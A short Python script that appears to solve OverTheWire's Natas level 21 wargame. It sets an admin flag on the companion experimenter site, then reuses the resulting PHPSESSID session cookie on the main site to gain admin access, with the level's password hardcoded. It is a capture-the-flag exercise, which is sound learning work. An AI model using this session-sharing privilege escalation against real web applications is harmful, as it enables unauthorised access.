import sys
import requests as req

username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"
url = "http://%s-experimenter.natas.labs.overthewire.org/" % username
url_orig = "http://%s.natas.labs.overthewire.org/" % username

data = {"admin": "1", "submit": "Update", "debug": ""}
s = req.session()

r = s.get(url, auth=(username, password), params=data)
print(r.text)
print(r.cookies)

r = s.get(url_orig, auth=(username, password), cookies={"PHPSESSID":
r.cookies["PHPSESSID"]})
print(r.text)
print(r.cookies)
